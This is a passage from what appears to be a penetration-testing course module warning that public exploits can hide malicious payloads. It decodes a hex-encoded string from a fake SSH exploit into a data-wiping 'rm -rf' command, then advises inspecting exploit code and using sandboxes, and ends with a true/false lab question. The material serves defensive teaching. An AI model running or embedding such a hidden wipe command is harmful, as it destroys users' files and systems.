... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer